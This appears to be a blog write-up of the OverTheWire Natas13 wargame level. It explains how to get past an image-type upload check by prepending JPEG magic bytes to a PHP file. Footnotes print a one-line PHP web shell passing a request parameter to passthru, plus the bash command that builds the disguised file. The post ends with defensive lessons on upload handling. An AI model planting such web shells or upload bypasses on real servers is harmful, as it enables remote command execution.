<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="OWicca"><meta name=generator content="Hugo 0.102.3"><title>OTW Natas13 — Down the wabbit's hole</title><meta name=description content><link rel=canonical href=https://www.dinudev.com/journey/otw_natas13/><link href rel=alternate type=application/rss+xml title="Down the wabbit's hole"><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Arvo:400,700"><link rel=stylesheet href=https://www.dinudev.com/css/highlight.css><link rel=stylesheet href=https://www.dinudev.com/css/paperback.css><link rel=stylesheet href=https://www.dinudev.com/css/main.css></head><link rel=stylesheet href=https://www.dinudev.com/css/tabs.css><body><div class=container><header><h1>OTW Natas13</h1><nav class=site-nav><a href=/>Home</a>
<a href=/post/>All posts</a>
<a href=/journey/>The journey</a>
<a href=/paper/>Papers</a></nav></header><h3>Table of Contents</h3><aside><nav id=TableOfContents><ul><li><ul><li><a href=#steps>steps:</a></li><li><a href=#lessons>lessons:</a></li></ul></li></ul></nav></aside><article><h3 id=steps>steps:</h3><ol><li>this is 90% like <code>natas12</code>, the difference is that <code>exim_imagetype</code> is used on the uploaded file,<br>to check if the file is a image file</li><li>the solution I found is to play around with mime-type checking <sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup> and
camouflage the <code>img.php</code> file in some other mime-type, such as a jpeg</li><li>the camouflage, for jpeg in particular, meant I should just add a few magic bytes to the start of the file: <code>ff d8 ff e0</code></li><li>generate the fake jpeg <sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup><sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup> and follow the natas12 flow to upload the file and get the contents of natas14 file</li></ol><h3 id=lessons>lessons:</h3><ol><li>always mime-check uploaded files</li><li>almost always uploaded files are data, so store them in data folders and<br>never execute them or allow them to be executed</li></ol><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>Mime types are the way to differentiate quickly between file types.<br>Oses initially use extension letters to uniquely identify file types.<br>On the internet, blobs of data can have extensions only on the endpoints,<br>so content sniffing is used to identify the data type, by reading the first bytes in the blob.<br>Most of the mime type checking means verifying the first bytes of the files.<br>Some common mime types:</p><ul><li>GIF: <code>47 49 46 38</code></li><li>JPEG: <code>ff d8 ff e0</code></li><li>PNG: <code>89 50 4e 47</code></li><li>ELF executable: <code>7f 45 4c 46</code></li><li>MS executable: <code>4d 5a</code></li></ul>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></li><li id=fn:2><p>Script contents <code>php.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>	
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>passthru</span>($_REQUEST[<span style=color:#e6db74>&#34;q&#34;</span>]);
</span></span></code></pre></div>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></li><li id=fn:3><p>Generate camouflaged php file with bash:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#MAGIC_JPEG=&#34;ffd8&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#MAGIC_JFIF=&#34;ffe0&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 1. send the hexbytes to cat</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 2. cat can receive multiple inputs and concatenates them to output in the order received</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 3. hexbytes + contents of php.php, then redirect to jpeg.php</span>
</span></span><span style=display:flex><span>printf <span style=color:#e6db74>&#34;\xff\xd8\xff\xe0&#34;</span> | cat - php.php &gt; jpeg.php
</span></span></code></pre></div>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></li></ol></div></article><nav class=site-nav><a href=https://www.dinudev.com//>Home</a>
<a href=https://www.dinudev.com//post/>All posts</a>
<a href=https://www.dinudev.com//journey/>The journey</a>
<a href=https://www.dinudev.com//paper/>Papers</a>
<a href=https://github.com/Owicca>GitHub</a></nav><footer class=site-footer><span class=owner>©2023 OWicca</span></footer></div><script src=https://www.dinudev.com/js/highlight.pack.js></script>
<script>hljs.initHighlightingOnLoad()</script></body></html>